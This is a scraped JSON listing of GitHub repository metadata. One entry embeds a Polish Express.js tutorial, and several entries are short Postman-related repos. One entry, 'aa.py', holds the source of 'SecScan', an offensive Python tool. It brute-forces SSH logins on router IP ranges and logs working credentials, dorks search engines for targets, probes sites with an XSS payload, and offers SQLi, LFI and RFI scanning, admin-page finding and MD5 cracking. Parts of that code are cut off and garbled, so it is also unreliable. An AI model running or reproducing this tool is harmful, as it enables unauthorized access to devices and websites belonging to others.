Chodzi oczywiście o dane, które zostały wskazane przy wysyłaniu żądania. Kolejnym pojęciem jest URI (nazywane również PATH) - jest to właśnie wspomniany wcześniej endpoint, który zawiera polecenia do wykonania gdy zostanie wywołany przez żądanie.  Czas start! Na początek stwórzmy plik server.js w katalogu z projektem. Po zainstalowaniu powyższych zależności, drzewo projektu powinno wyglądać w następujący sposób:   Aby mieć możliwość skorzystania z zainstalowanych zależności, na początku należy zadeklarować zmienną, w której będziemy przechowywać funkcjonalności pakietu Expressa.  var express = require('express'); Jak widzisz, każda paczka JS'a działa dokładnie w taki sam sposób. Koncepcja modułów będzie przewijać się aż do końca tego kursu. Następnym krokiem będzie stworzenie aplikacji Express:  var app = express(); Naszą aplikację przypisaliśmy do zmiennej app. Teraz możemy sprawić, aby odpowiadała prostym Hello world w momencie, w którym odbierzemy wysłane zapytanie GET na adres strony domowej:  app.get('/', function(req, res) {     res.send('Hello world'); }); Powyższy kod rejestruje pierwszy routing (proces przetwarzania otrzymanego adresu żądania i na jego podstawie decydowanie, co powinno zostać uruchomione) na wysłane żądanie GET po wejściu na stronę główną ( http://localhost:3000/ ). Jako callback na wystąpienie tego zdarzenia wywoływana jest funkcja, która w przypadku udanej odpowiedzi wyśle wiadomość Hello world.  To jednak jeszcze nie koniec. Zarejestrowaliśmy obsługę pierwszego routingu, ale należy zainicjować nasłuchiwanie serwera na to i inne zdarzenia. Dopiszmy więc:  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Po zapisaniu powyższego kodu, należy uruchomić go komendą node server.js (lub za pomocą Nodemona, którego poznaliśmy w pierwszym module) - teraz po ponownym wejściu na adres http://localhost:3000/ powinniśmy zobaczyć następujący widok:   Jest to znak, że nasza aplikacja działa!  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.3. Route, czyli ścieżka wyznaczona dla użytkownika aplikacji Wykorzystanie endpointów Rozwińmy teraz trochę aplikację stworzoną w poprzednim podrozdziale. Aktualnie kod w pliku server.js wygląda następująco:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Endpointy statyczne Na początek zmodyfikujemy lekko żądanie GET i do strony głównej zamiast Hello world! wpiszmy Hello GET! oraz dodamy linijkę drukującą otrzymane żądanie (po stronie serwera) jak poniżej:  app.get('/', function (req, res) {     console.log('Otrzymałem żądanie GET do strony głównej');     res.send('Hello GET!'); }); Warto w tym miejscu wspomnieć o narzędziu Postman - możesz pobrać je ze strony https://www.getpostman.com/. Używa się go do testowania endpointów. Postman jest prosty i intuicyjny w obsłudze - wystarczy, że podasz adres oraz metodę HTTP, jakiej chcesz użyć w odpowiednich polach i… już :) Pozostaje tylko wysłanie requesta i sprawdzenie czy response zgadza się z naszymi oczekiwaniami.   Dodajmy też inne metody HTTP do naszej aplikacji. Zacznijmy od POST. Dla tej i kolejnej metody wykonamy podobne operacje. Chodzi tutaj o to, aby zaobserwować działanie zarejestrowanych endpointów.  app.post('/', function (req, res) {     console.log('Otrzymałem żądanie POST do strony głównej');     res.send('Hello POST!'); }); Do tego czasu oba nasze zapytania kierowaliśmy do strony domowej. Dodajmy teraz obsługę żądania z metodą DELETE oraz inną ścieżką:  app.delete('/del_user', function (req, res) {     console.log('Otrzymałem żądanie DELETE do strony /del_user');     res.send('Hello DELETE!'); }); DLA CHĘTNYCH: Przetestuj powyższe zapytanie w Postmanie! :)  Dla praktyki, dodajmy jeszcze kilka innych endpointów, a następnie przejdźmy do testowania.  app.get('/list_user', function (req, res) {     console.log('Otrzymałem żądanie GET do strony /list_user');     res.send('Strona z listą użytkowników!'); });  app.get('/ab*cd', function(req, res) {     console.log('Otrzymałem żądanie GET do strony /ab*cd');     res.send('Wzór pasuje'); }); Po dodaniu powyższych fragmentów kodu zapisz plik server.js, a następnie ponownie użyj komendy node server.js chyba, że używasz Nodemona :)  Zerknijmy na endpoint /list_user   Otrzymaliśmy to, czego oczekiwaliśmy. Sprawdźmy jeszcze inne.    Jeśli jednak użyliśmy endpointa, którego nie zdefiniowaliśmy, otrzymamy odpowiedź jak na ostatnim obrazku.  Endpointy dynamiczne Istnieje również inny typ endpointów, które nazywa się dynamicznymi. Używanie ich pozwala na przekazywanie parametrów i bazowanie na nich. Wróćmy na moment do kodu stworzonego na samym początku:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przykładowa aplikacja nasłuchuje na http://localhost:3000'); }); Najpierw zmodyfikujemy trochę bazowy kod. Usuńmy linijki 8-10, które miały nam tylko pokazać podstawowe informacje na temat serwera. Zamiast tego napiszmy po prostu: app.listen(3000);  Tworzenie dynamicznego routingu pozwala na przekazywanie parametrów, więc spróbujmy najpierw z przykładowym id. Zamiast odwołać się do strony domowej ('/'), odwołajmy się do zmiennego parametru id. Parametr zmienny od statycznego rozróżnia się poprzez dodanie dwukropka (:) przed nazwę. W naszym przykładzie endpoint będzie więc wyglądał następująco:  /:id Zmieńmy jeszcze odpowiedź z Hello world na 'Identyfikator, który został dopisany to ' + req.params.id.  Czym jest req.params.id? req jest obiektem reprezentującym zapytanie HTTP (ang. request). Posiada on różne parametry, jak na przykład body (czyli ciało zapytania), nagłówki HTTP oraz parametry (params), które mamy zamiar odczytać.  Parametr, który wstawiliśmy jako część adresu w metodzie GET, przekazujemy jako id. W poniższym przypadku wyświetli się komunikat Identyfikator który został dopisany to 123, o ile zapytanie wysłano na adres http://localhost:3000/123.   Popróbuj z różnymi innymi parametrami i sprawdź czy aplikacja działa tak, jak tego oczekujesz.  Obsługa błędu 404 za pomocą ExpressJS Co jeśli serwer nie rozpozna żądania? W Expressie odpowiedź 404 nie jest wynikiem błędu, więc nie jest wyłapywany w trakcie działania aplikacji. Spowodowane jest to tym, że 404 zwykle oznacza brak możliwości wykonania danej czynności, a nie błąd występujący z powodu jakiejś 'wpadki' programisty. Innymi słowy, Express wykonał wszystkie funkcje middleware (które poznamy w kolejnym rozdziale) oraz route'y i dopiero wtedy dowiedział się, że żaden z nich nie odpowiedział na żądanie - taki przypadek możemy obsłużyć poprzez dodanie funkcji middleware na samym końcu (poniżej pozostałych funkcji), aby obsługiwała status 404.  Powróćmy znów do poprzedniego szablonu z metodą GET na stronę domową ('/'), która zwraca nam Hello world!. Dopiszmy teraz metodę middleware, która obsłuży nam błąd 404.  Na samym końcu, poniżej fragmentu z nasłuchiwaniem dodajmy obsługę odpowiedzi 404:  app.use(function (req, res, next) {     res.status(404).send('Wybacz, nie mogliśmy odnaleźć tego, czego żądasz!') }); Po ponownym uruchomieniu skryptu, w przeglądarce powinieneś zobaczyć Hello world!. Spróbuj teraz dopisać coś na koniec adresu (tak jak w poprzednim rozdziale dopisaliśmy id). Powinieneś otrzymać następujący komunikat:   Parametr next, który przekazujemy do funkcji jest funkcją, która pozwala “iść dalej\" do kolejnej funkcji middleware lub zakończenia żądania.  Można w ten sposób stworzyć także obsługę pozostałych błędów. Najczęściej obsługiwane błędy to:  400 - bad request - występuje gdy serwer nie może przetworzyć zapytania 401 - unauthorized - występuje gdy wymagane jest uwierzytelnienie, a nie zostało dostarczone 403 - forbidden - żądanie jest poprawne, jednak serwer odmawia odpowiedzi, może to wystąpić w przypadku gdy np. użytkownik jest zalogowany ale nie ma uprawnień do wykonania żądania 404 - not found - zasoby nie zostały znalezione 500 - internal server error - występuje gdy występują nieznane warunki i nie ma żadnej konkretnej wiadomości Zadanie: Operacje CRUD na pliku JSON Stwórzmy teraz aplikację, która będzie otwierać zewnętrzne pliki .json oraz edytować je. Zanim zaczniemy, w folderze projektu stwórz plik server.js, a następnie zainicjalizuj projekt poprzez wpisanie npm init w konsoli.  Przejdźmy do pobrania potrzebnych zależności - tym razem będzie nam potrzebny Express oraz body-parser. Jak się zapewne domyślasz, możesz zainstalować je za pomocą komendy npm install --save express body-parser. Po pobraniu paczek, możemy śmiało przejść do pisania kodu - na początek przypisz zależności do zmiennych w pliku server.js. Dodaj także linijkę var fs = require('fs') - fs będzie nam potrzebny do operacji na plikach. Nie musimy go instalować, bo jest on wbudowany w Node :)  Skoro zależności mamy już załatwione, zadeklaruj zmienną app, która wywoła funkcję express() oraz zmienną stringifyFile (na razie bez zadeklarowanej wartości).  Tuż pod deklaracją zmiennych dodaj także linijkę app.use(bodyParser.json()); - to pozwoli Ci wykorzystać middleware body-parser, które zainstalowaliśmy przed chwilą. body-parser jest nam potrzebny, aby korzystać z formatu application/json - póki co nie przejmuj się pojęciem middleware, zajmiemy się nim nieco dalej w tym kursie :)  Stwórz teraz endpoint GET /getNote, gdzie po wywołaniu zostanie wczytany Twój zewnętrzny plik JSON oraz wyświetlona zostanie jego zawartość. Przykłądowy plik test.json:  {\"menu\": {    \"id\": \"file\",    \"value\": \"File\",    \"popup\": {      \"menuitem\": [        {\"value\": \"New\", \"onclick\": \"CreateNewDoc()\"},        {\"value\": \"Open\", \"onclick\": \"OpenDoc()\"},        {\"value\": \"Close\", \"onclick\": \"CloseDoc()\"}      ]    }  }} Metoda która pozwoli nam na odczytanie pliku to readFile, którą można wywołać z zadeklarowanego wcześniej fs. Jako parametry przyjmuje ona najpierw plik, następnie opcje (np. kodowanie) i funkcję, która wywoła się po załadowaniu. W naszym przypadku będzie to więc następujący kod: fs.readFile('./test.json', 'utf8', function(err, data) {     if (err) throw err;     stringifyFile = data     res.send(data); }); Teraz pora na stworzenie endpointa, który po wywołaniu nadpisze nam podany plik. Stworzymy do tego dynamiczny endpoint, który dopisze do pliku string, który przekażemy jako parametr. Stwórz tym razem POST na /updateNote/:note. Po jego wywołaniu tekst, który znajduje się w miejscu /:note powinniśmy dopisać do wczytanego pliku poprzez dodanie req.params.note do zmiennej stringifyFile, która przechowuje aktualną zawartość pliku.  Po przypisaniu powyższej zmiennej, należy ponownie odwołać się do modułu fs tym razem używając metody writeFile. Pomoże nam w tym następujący fragment kodu:  fs.writeFile('./test.json', stringifyFile, function(err) {     If (err) throw err;     console.log('file updated'); }); Na końcu pliku dodaj nasłuchiwanie na porcie 3000.  Zapisz plik i uruchom aplikację wpisując node server.js w konsoli.  Otwórz Postmana, ustaw metodę zapytania na GET, a w pole adresu wpisz http://localhost:3000/getNote. Jako response powinieneś otrzymać Twój stworzony wcześniej plik JSON. Po zmianie z GET na POST oraz wpisaniu /updateNote/test zamiast /getNote oraz wysłaniu requesta, Twój plik JSON powinien zostać zaktualizowany o słowo test :)  Po ukończeniu zadania, wrzuć swój kod na Githuba i przekaż link do repozytorium mentorowi :)  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_3.git   Wyslij link  17.4. Serwowanie plików statycznych Express posiada wbudowaną możliwość serwowania plików statycznych - takimi plikami są na przykład obrazki, pliki CSS czy JS. Aby serwować te pliki statycznie, wystarczy użyć express.static. Pliki statyczne to pliki, które zostają dostarczone do klienta bez generowania, modyfikacji czy przetwarzania - jedyne, co trzeba z nimi zrobić, to przekazać nazwę katalogu, w którym są przetrzymywane, do express.static - to wystarczy aby zacząć je serwować. Spróbujmy przedstawić to sobie na przykładzie.  Załóżmy, że przetrzymujesz swoje zdjęcia i pliki CSS w katalogu assets/. Aby zacząć je serwować, możesz więc użyć następującej linijki:  app.use(express.static('assets')); Zmodyfikujmy więc całkowicie naszą aplikację. Najpierw stwórzmy w katalogu projektu nowy katalog o nazwie assets/. Wrzućmy do niego jakiekolwiek zdjęcie/obrazek. W pliku server.js wróćmy do poprzedniego stanu (zanim zaczęliśmy zajmować się routingiem):  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, 'localhost', function() {     var host = server.address().address;     var port = server.address().port;      console.log('Przykładowa aplikacja nasłuchuje na http://' + host + ':' + port); }); W tym przykładzie sami definiujemy port i adres, ale w prawdziwej aplikacji moglibyśmy tych wartości nie znać. Częstym przykładem jest sytuacja w której adres i port są zdefiniowane w osobnym pliku konfiguracyjnym. Ten plik byłby inny na naszym komputerze niż na serwerze na którym będziemy publikować aplikację - ale nasz kod ma działać w obu lokalizacjach. Dlatego do wyświetlenia linka potrzebowalibyśmy pobrania tych danych za pomocą metody .address().  Pozostaje teraz jedynie w linii nr 3 dodać to, o czym powiedzieliśmy sobie chwilkę temu, czyli linijkę app.use(express.static('assets'));  Dla przypomnienia, w nawiasach do express.static przekazujemy katalog, w którym znajdują się pliki, które chcemy serwować. Po zapisaniu pliku server.js, możemy uruchomić aplikację. Teraz, aby zobaczyć nasz obrazek, wystarczy że po http://localhost:3000/ podamy nazwę pliku z rozszerzeniem - u mnie wygląda to tak:   Stwórz sobie teraz prosty plik index.html, który będzie miał formularz z dwoma inputami typu text (o nazwach first_name i last_name) oraz jednym typu submit. Element  posiada atrybuty takie jak action oraz method. Atrybut action pozwala określić, gdzie wysłać dane z formularza w momencie, gdy zostanie on zatwierdzony. W naszym przypadku będzie to http://localhost:3000/userform. Atrybut method określa metodę, jakiej chcemy użyć - w naszym przypadku niech będzie to GET.  Przykładowo, Twój index.html może wyglądać tak:                          Node Hello world example                                                 First Name:                                            Last Name:                                           Gdy już będzie gotowy, wrzuć go do katalogu /assets.  Teraz czas na modyfikację pliku server.js. Najpierw zmieńmy to, co chcemy wysyłać, gdy zostanie wysłane żądanie do strony domowej.  Zamień więc res.send('Hello world') na res.sendFile('/index.html') - jak się zapewne domyślasz, res.sendFile() wysyła w odpowiedzi plik zamiast wiadomości.  Musimy również dodać obsługę żądania na endpoint, do którego będziemy kierować nasz formularz.  app.get('/userform', function (req, res) {     const response = {         first_name: req.query.first_name,         last_name: req.query.last_name     };     res.end(JSON.stringify(response)); }); W czasie przetwarzania żądania, tworzymy nowy obiekt response, który ma klucze first_name oraz last_name. Do poszczególnych właściwości przypisujemy dane, które otrzymujemy w obiekcie req (od ang. request), czyli w obiekcie z żądaniem. Na koniec wyświetlamy nasz obiekt przetworzony na typ string za pomocą metody JSON.stringify. Po zapisaniu pliku server.js, aplikacja powinna pokazywać formularz, jak poniżej.   Po wpisaniu wartości do inputów i wysłaniu ich, powinieneś zostać przekierowany do strony /userform, a po znaku zapytania powinny zostać wyświetlone parametry umieszczone przez Ciebie w inputach.   Zadanie: Żonglujemy danymi pomiędzy endpointami Napisz kod obsługujący formularz zgodnie z wskazówkami z tego submodułu, a następnie wyślij swój kod na repozytorium oraz przekaż go do sprawdzenia mentorowi.  Podgląd zadania  https://github.com/martinproxy0/Zadanie_17_4.git   Wyslij link 17.5. Middleware - pośrednik między żądaniem a odpowiedzią",
    "fork": false,
    "created_at": "2018-01-26T19:03:05Z",
    "updated_at": "2018-01-26T19:03:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13038633,
    "owner_login": "martinproxy0",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/13038633?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "data",
      "request",
      "form",
      "file",
      "application",
      "server",
      "call",
      "node",
      "json",
      "http",
      "user",
      "develop",
      "express",
      "auto",
      "example",
      "automat",
      "implement",
      "format",
      " express",
      "auth",
      "endpoint",
      "framework",
      "route",
      "https",
      "function",
      "demo",
      "send",
      "local",
      "list",
      "star",
      "source",
      "read",
      "front",
      "update",
      "response",
      "stat",
      "host",
      "start",
      "delete",
      "face",
      "package",
      "method",
      "info",
      "developer",
      "system",
      "name",
      "html",
      "action",
      "module",
      "program",
      "infor",
      "github",
      "model",
      "tech",
      "esse",
      "text",
      "getpost",
      "problem",
      "install",
      "parse",
      "link",
      "proxy",
      "folder",
      "status",
      "require",
      "middleware",
      "parser",
      "console",
      "intern",
      "note",
      "popular",
      "party",
      "write",
      "query",
      "sets",
      "updated",
      "dynamic",
      "modules",
      "routing",
      "role",
      "world",
      "address",
      "dependencies",
      "found",
      "error",
      "internal",
      "listen",
      "jest",
      "kurs",
      "rake",
      "ekspresowe",
      "kazan",
      "wars"
    ]
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 211283078,
    "name": "postman-export-formatter",
    "full_name": "john-lock/postman-export-formatter",
    "description": "A formatter for Postman Collection exports for file uploads. Allowing users to put the desired path in the description and have this path writtening into the file upload path - rather than having the default relative paths given by PM",
    "fork": false,
    "created_at": "2019-09-27T09:22:43Z",
    "updated_at": "2020-03-13T11:24:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 36238895,
    "owner_login": "john-lock",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/36238895?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "script",
      "user",
      "format",
      "load",
      "export",
      "users",
      "written",
      "desc",
      "upload",
      "given",
      "default",
      "description",
      "exports",
      "path",
      "having",
      "formatter"
    ]
  },
  {
    "id": 53600558,
    "name": "lab20And21",
    "full_name": "kjschmidt913/lab20And21",
    "description": "A function that will return random facts, exported from a different file. Converted the app to Express. Created routes to retrieve facts. Tested using Postman. Created a front-end for the app (added public folder, configured express app to point to the public folder). Used an AJAX call from the front end to retrieve the random facts.",
    "fork": false,
    "created_at": "2016-03-10T16:38:25Z",
    "updated_at": "2016-03-10T16:39:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16869564,
    "owner_login": "kjschmidt913",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/16869564?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "call",
      "express",
      " express",
      "route",
      "function",
      "export",
      "routes",
      "front",
      "rent",
      "config",
      "public",
      "folder",
      "exported",
      "retrieve",
      "front end",
      "configure",
      "added",
      "random",
      "facts"
    ]
  },
  {
    "id": 122879725,
    "name": "polyman",
    "full_name": "domgreen/polyman",
    "description": null,
    "fork": false,
    "created_at": "2018-02-25T21:39:22Z",
    "updated_at": "2019-11-19T21:49:37Z",
    "stargazers_count": 7,
    "watchers_count": 7,
    "forks": 2,
    "watchers": 7,
    "score": 1,
    "owner_id": 156558,
    "owner_login": "domgreen",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/156558?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 166232472,
    "name": "JavaEntityFrameworkFromDatabaseToPostMan",
    "full_name": "BahgatMashaly/JavaEntityFrameworkFromDatabaseToPostMan",
    "description": "Auto generate  model, repository, service, controller and postman file ",
    "fork": false,
    "created_at": "2019-01-17T13:43:04Z",
    "updated_at": "2019-01-21T07:37:39Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6259704,
    "owner_login": "BahgatMashaly",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/6259704?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "repo",
      "file",
      "repos",
      "repository",
      "service",
      "generate",
      "model",
      "control",
      "controller"
    ]
  },
  {
    "id": 249724934,
    "name": "webshop-back-config",
    "full_name": "fdmeregildo/webshop-back-config",
    "description": "docker file, database file, integration testing, readme example, postman file, others",
    "fork": false,
    "created_at": "2020-03-24T14:08:00Z",
    "updated_at": "2020-03-24T14:09:52Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15707963,
    "owner_login": "fdmeregildo",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15707963?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "data",
      "testing",
      "file",
      "database",
      "example",
      "integration",
      "read",
      "docker",
      "readme"
    ]
  },
  {
    "id": 202611932,
    "name": "Dictionary_Api",
    "full_name": "unicobib/Dictionary_Api",
    "description": "upload .txt file from POSTMAN. Application will read all the words from that file and store that into H2 database.",
    "fork": false,
    "created_at": "2019-08-15T21:10:31Z",
    "updated_at": "2019-08-26T15:15:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33726347,
    "owner_login": "unicobib",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/33726347?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "file",
      "database",
      "load",
      "read",
      "store",
      "upload",
      "words"
    ]
  },
  {
    "id": 226541388,
    "name": "gocrudapi",
    "full_name": "patabhi/gocrudapi",
    "description": "crud api in golang with postgres database. 1> Run server.go file. 2> Test the api using postman.",
    "fork": false,
    "created_at": "2019-12-07T16:16:52Z",
    "updated_at": "2020-01-22T17:53:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38621057,
    "owner_login": "patabhi",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/38621057?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "file",
      "server",
      "database",
      "lang",
      "crud",
      "golang",
      "postgres",
      "crud api"
    ]
  },
  {
    "id": 177793199,
    "name": "yhcr-proxy-server-api-tests",
    "full_name": "thatinterfaceguy/yhcr-proxy-server-api-tests",
    "description": "Docker compose file, postman environment and collection for running tests against YHCR FHIR proxy servers locally",
    "fork": false,
    "created_at": "2019-03-26T13:23:38Z",
    "updated_at": "2019-04-30T10:28:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 45122994,
    "owner_login": "thatinterfaceguy",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/45122994?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "collect",
      "collection",
      "file",
      "tests",
      "server",
      "tests ",
      "call",
      "environment",
      "local",
      "running",
      "proxy",
      "locally",
      "servers",
      "compose"
    ]
  },
  {
    "id": 167654063,
    "name": "PostmanToSwagger_GO",
    "full_name": "LiuKaHo/PostmanToSwagger_GO",
    "description": null,
    "fork": false,
    "created_at": "2019-01-26T05:37:05Z",
    "updated_at": "2019-02-18T14:59:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15521041,
    "owner_login": "LiuKaHo",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15521041?v=4",
